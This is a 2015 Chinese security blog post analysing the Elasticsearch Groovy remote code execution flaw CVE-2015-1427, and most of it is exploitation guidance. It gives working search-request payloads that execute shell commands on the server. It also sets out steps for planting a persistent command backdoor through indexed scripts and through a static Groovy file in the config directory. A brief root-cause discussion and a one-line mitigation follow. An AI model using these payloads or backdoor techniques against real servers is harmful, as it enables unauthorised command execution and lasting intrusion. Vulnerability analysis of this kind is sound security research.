<!DOCTYPE html>
<html lang="zh-cn">

  <head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      ElasticSearch 远程代码执行漏洞分析（CVE-2015-1427）&amp;高级利用方法 &middot; 奇门遁甲
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="/public/css/label.css">
  <link rel="stylesheet" href="/public/css/global.css">

  <!-- Icons -->
  <link rel="shortcut icon" href="/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">

</head>


  <body class="theme-base-ff">

    <div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <h1>
        <a href="/">
          奇门遁甲
        </a>
      </h1>
      <p class="lead"></p>
    </div>

    <nav class="sidebar-nav">
      <a class="sidebar-nav-item" href="/">Home</a>


      </ul>
      

      
      
        
          
        
      
        
          
            <a class="sidebar-nav-item" href="/about.html">About</a>
          
        
      
        
      
        
      
        
          
        
      
        
          
            <a class="sidebar-nav-item" href="/tags.html">标签</a>
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      

        <a class="sidebar-nav-item" href="/categories.html" >文章分类</a>
        <ul class="sidebar-nav-subitem">
            
            <li><a href="/categories.html#读书">读书 <small>(7)</small></a>
            </li>
            
            <li><a href="/categories.html#随想">随想 <small>(5)</small></a>
            </li>
            
            <li><a href="/categories.html#技术">技术 <small>(9)</small></a>
            </li>
            
            <li><a href="/categories.html#no-category">未分类</a>
            </li>
        </ul>
    </nav>

  </div>
</div>


    <div class="content container">
      <div class="post">
  <h1 class="post-title">ElasticSearch 远程代码执行漏洞分析（CVE-2015-1427）&amp;高级利用方法</h1>
  <p>
      <span >06 Mar 2015 by
          <a href="#">tang3</a>
      </span>&nbsp;&nbsp;
      
         <span class="ui mini tag label" >ElasticSearch</span>
      
         <span class="ui mini tag label" >Expression Language</span>
      
  </p>
  <h3 id="0x00-漏洞概述">0x00 漏洞概述</h3>

<p>我第一次知道CVE-2015-1427这个漏洞是在2月13日（春节放假前一天），但是当时想着过年，而且觉得应该是Groovy自身的问题，就也没太在意。知道前两天兰少（lupin）问我有没有看这个漏洞，说他找到了绕过了沙盒的方法，才跑去看。</p>

<p>我跟lupin玩这个洞的思路不太一样，而且漏洞原理在他的文章里已经说的很清楚了，我这篇文章主要侧重这个漏洞利用的各种玩法。</p>

<!-- more -->

<h3 id="0x01-漏洞原理">0x01 漏洞原理</h3>

<p>漏洞原因很简单，由于沙盒代码黑名单中的Java危险方法不全，从而导致恶意用户仍可以使用反射的方法来执行Java代码。这就完了？当然不是！由于Elasticsearch开发团队没有完全认知Groovy的强大，以为仅仅防止用户调用Java反射就可以免于被攻击，这真是太好笑了，我们来看下Groovy对自己的描述：</p>

<p><img src="/assets/images/2015-03/groovy.png" alt="groovy" /></p>

<p>没错！Groovy是一款开发语言，这意味着我们完全可以在不使用Java的前提下实现代码执行。如果仅仅是沙盒的问题，那么修补黑白名单到攻击者没办法绕过沙盒使用Java反射就好了，但是一种语言要怎么靠黑白名单来限制它的绝大部分功能？所以没有把Groovy当做一种编程语言是这问题的真正原因。</p>

<h3 id="0x02-漏洞利用">0x02 漏洞利用</h3>

<p>漏洞利用其实也很简单，我们只需要参照官方提供的script使用说明来执行脚本就可以了。<a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html">官方文档</a>提供了两个方法让我们直接执行脚本代码。</p>

<p>我们先来看第一种方式——直接执行脚本，这种方式也就是目前大家都在使用的方式。使用起来也很简单，直接向/_search这个URL提供如下POST内容：</p>

<div class="language-groovy highlighter-rouge"><pre class="highlight"><code><span class="o">{</span><span class="s2">"script_fields"</span><span class="o">:</span> <span class="o">{</span><span class="s2">"my_field"</span><span class="o">:</span> <span class="o">{</span><span class="s2">"script"</span><span class="o">:</span> <span class="s2">"def command=\"netstat -an\";def res=command.execute().text;res"</span><span class="o">,</span><span class="s2">"lang"</span><span class="o">:</span><span class="s2">"groovy"</span><span class="o">}}}</span>
</code></pre>
</div>

<p>效果如下图所示：</p>

<p><img src="/assets/images/2015-03/script.png" alt="script" /></p>

<p>官方文档除了直接执行脚本，还提供了一种预先存储脚本用于以后执行的方式——脚本索引，这种方法使用起来比较繁琐，下面我们先来看官方提供的示例：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>//建立脚本索引
curl -XPOST localhost:9200/_scripts/groovy/indexedCalculateScore -d '{
     "script": "log(_score * 2) + my_modifier"
}'
//使用脚本索引，并执行脚本索引中的代码
curl -XPOST localhost:9200/_search -d '{
  "query": {
    "function_score": {
      "query": {
        "match": {
          "body": "foo"
        }
      },
      "functions": [
        {
          "script_score": {
            "script_id": "indexedCalculateScore",
            "lang" : "groovy",
            "params": {
              "my_modifier": 8
            }
          }
        }
      ]
    }
  }
}'
</code></pre>
</div>

<p>下面我们来看实际操作，首先是建立脚本索引：</p>

<div class="language-json highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
     </span><span class="nt">"script"</span><span class="p">:</span><span class="w"> </span><span class="s2">"def command=\"netstat -an\";def res=command.execute().text;res"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre>
</div>

<p>然后是执行刚刚建立的脚本索引，由于官方给的示例中不可以返回字符串，所以这里我修改了POST提交的内容。</p>

<div class="language-json highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nt">"query"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
       </span><span class="nt">"match_all"</span><span class="p">:{</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nt">"script_fields"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nt">"test1"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nt">"script_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"indexedCalculateScore"</span><span class="p">,</span><span class="w">
            </span><span class="nt">"lang"</span><span class="p">:</span><span class="s2">"groovy"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre>
</div>

<p>这种方法相比较直接执行脚本多了一个存储的步骤，但是却不失为一种留后门的好方法。如果我们这样建立一条脚本索引：</p>

<div class="language-json highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
     </span><span class="nt">"script"</span><span class="p">:</span><span class="w"> </span><span class="s2">"def res=command.execute().text;res"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre>
</div>

<p>然后这样执行它：</p>

<div class="language-json highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nt">"query"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
       </span><span class="nt">"match_all"</span><span class="p">:{</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nt">"script_fields"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nt">"test1"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nt">"script_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"indexedCalculateScore"</span><span class="p">,</span><span class="w">
            </span><span class="nt">"lang"</span><span class="p">:</span><span class="s2">"groovy"</span><span class="p">,</span><span class="w">
            </span><span class="nt">"params"</span><span class="p">:{</span><span class="w">
                 </span><span class="nt">"command"</span><span class="p">:</span><span class="s2">"netstat -an"</span><span class="w">
             </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre>
</div>

<p>完美的一个shell命令后门就完成了，效果如下图所示：</p>

<p><img src="/assets/images/2015-03/indexed-script.png" alt="indexed-script" /></p>

<p>不过使用脚本索引建立的后门有一个问题，就是需要在动态脚本开启的状态下。而官方提供给我们的最后一个调用脚本的方式——调用静态脚本，刚刚好可以帮助我们维持后门的持久性。</p>

<p>使用方法如下：在config目录下建立一个名为scripts的目录，把脚本文件放进去，然后用script_file替换上面的script_id字段就好了。这里做一个简单的例子，在scripts里放上我们刚才的的那个shell后门的代码，并命名为vul.groovy，然后POST如下数据进行搜索：</p>

<div class="language-json highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nt">"script_fields"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nt">"my_field"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nt">"file"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vul"</span><span class="p">,</span><span class="w">
            </span><span class="nt">"params"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                  </span><span class="nt">"command"</span><span class="p">:</span><span class="s2">"netstat -an"</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre>
</div>

<p>如果你足够仔细的话，可能会发现上面的代码中我使用的file而不是官方示例的script_file，因为我测试环境是1.3.5和1.4.10，而官方所提供的示例应该是针对MVEL表达式时代的静态表达式使用方法，所以有些时候不看代码是无法发现真相的→_→。</p>

<h3 id="0x03-思维壁垒">0x03 思维壁垒</h3>

<p>在和lupin一开始讨论这个漏洞的时候，发现我们思考的方式完全不一样。他在跟我说怎么怎么绕过沙盒，而我却不断的问他沙盒在哪里？为什么我没有感觉到沙盒的存在？从lupin<a href="http://drops.wooyun.org/papers/5107">这篇文章</a>描述的细节和下面官方对这个漏洞描述的内容以及官方对于漏洞的后期修复，再到这两天的全民反射来看，大家明显是都被带到沟里去了，把一个好好的代码执行漏洞玩成了命令执行漏洞。</p>

<blockquote>
  <p>The vulnerabilities allow an attacker to construct Groovy scripts that escape the sandbox and execute shell commands as the user running the Elasticsearch Java VM.</p>
</blockquote>

<p>如果让我用一句话来评论目前的大家使用的PoC的话，“用C的方式来利用一个PHP代码执行”，这句话再合适不过了。我在<a href="http://drops.wooyun.org/tips/2494">《一种新的攻击方法——Java-Web-Expression-Language-Injection》</a>中提到的JELI的这种漏洞形式（或者说攻击方法），是由于开发者对于Java上层建筑的表达式认知度不够而导致漏洞的出现。Struts2没有想到Ognl可以执行Java代码，Elasticsearch同样没有想到Groovy可以实现任意Java功能。</p>

<p>所以在这里我觉得有必要提醒大家一下，小心思维壁垒的出现。</p>

<h3 id="0x04-漏洞总结">0x04 漏洞总结</h3>

<h4 id="漏洞小结">漏洞小结</h4>

<ol>
  <li>
    <p>影响范围个人评价为“高”，ElasticSearch在大数据时代得到广泛的使用，而且此漏洞覆盖十个左右的版本，所以影响范围还是很广的。</p>
  </li>
  <li>
    <p>危害性个人评价为“极高”，此漏洞值需要使用默认的动态脚本配置便可被利用，攻击者可以利用这个漏洞getshell。</p>
  </li>
</ol>

<h4 id="防护方案">防护方案</h4>

<p>关闭groovy沙盒以已停止动态脚本的使用：</p>

<div class="language-yml highlighter-rouge"><pre class="highlight"><code><span class="s">script.groovy.sandbox.enabled</span><span class="pi">:</span> <span class="s">false</span>
</code></pre>
</div>

<p>官方已经在最新版本中修复此问题，最新版下载链接为：
http://www.elasticsearch.org/overview/elkdownloads/</p>


</div>

<div class="related">
  <h2>相关文章:</h2>
  <ul class="related-posts">
    
    
      <li>
        <h3>
          <a href="/%E8%AF%BB%E4%B9%A6/2017/10/15/%E5%86%B3%E7%AD%96%E6%80%9D%E7%BB%B4-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-%E8%BF%87%E5%BA%A6%E8%87%AA%E4%BF%A1.html">
            《决策思维》读书笔记——第十九章《过度自信》
            <small>15 Oct 2017</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/%E8%AF%BB%E4%B9%A6/2017/04/13/2017%E5%B9%B4%E4%B8%AA%E4%BA%BA%E4%BD%BF%E5%91%BD%E5%AE%A3%E8%A8%80.html">
            2017年个人使命宣言
            <small>13 Apr 2017</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/%E8%AF%BB%E4%B9%A6/2017/04/09/%E9%AB%98%E6%95%88%E8%83%BD%E4%BA%BA%E5%A3%AB%E7%9A%84%E4%B8%83%E4%B8%AA%E4%B9%A0%E6%83%AF-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0.html">
            《高效能人士的七个习惯》读书笔记
            <small>09 Apr 2017</small>
          </a>
        </h3>
      </li>
    
    
  </ul>
</div>


<!-- UY BEGIN -->
<div id="uyan_frame"></div>
<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2093529"></script>
<!-- UY END -->

    </div>

  </body>
</html>
